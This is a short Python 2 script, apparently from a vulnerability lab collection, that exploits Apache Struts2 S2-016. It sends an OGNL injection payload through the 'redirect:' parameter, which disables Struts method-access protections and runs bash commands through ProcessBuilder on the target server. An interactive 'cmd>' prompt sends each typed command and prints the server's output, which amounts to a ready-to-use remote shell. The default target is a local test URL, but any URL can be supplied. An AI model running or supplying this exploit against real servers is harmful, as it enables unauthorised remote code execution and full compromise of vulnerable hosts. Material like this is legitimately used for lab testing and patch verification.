##############################################################################
#
# Copyright (c) 2018 Baidu.com, Inc. All Rights Reserved
#
##############################################################################
#!/usr/bin/python
# -*- coding: utf-8 -*-

import re
import ssl
import sys
import requests
import traceback

def _run(url, cmd):
    try:
        payload = 'redirect:'
        payload += '''${#context['xwork.MethodAccessor.denyMethodExecution']=false,'''
        payload += '''#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),'''
        payload += '''#f.setAccessible(true),'''
        payload += '''#f.set(#_memberAccess,true),'''
        payload += '''#cmd='%s',''' % cmd
        payload += '''#cmds={'bash','-c',#cmd},'''
        payload += '''#p=new%20java.lang.ProcessBuilder(#cmds),'''
        payload += '''#p.redirectErrorStream(true),'''
        payload += '''#process=#p.start(),'''
        payload += '''#ros=@org.apache.struts2.ServletActionContext@getResponse().'''
        payload += '''getOutputStream(),'''
        payload += '''@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),'''
        payload += '''#ros.flush()}.action'''

        payload = payload.replace('#', '%23')
        payload = payload.replace('=', '%3D')

        resp = requests.post(url, data = payload, headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'})
        print resp.text
    except Exception as e:
        traceback.print_exc()
        pass

if __name__ == "__main__":
    url = 'http://127.0.0.1:8080/S2-016/default.action' if len(sys.argv) == 1 else sys.argv[1]
    print 'Target URL=' + url

    while True:
        try:
            line = raw_input("cmd> ").strip()
            if line == 'exit':
                sys.exit()
            _run(url, line)
        except EOFError:
            print "\n"
            sys.exit()
        except Exception as e:
            print e
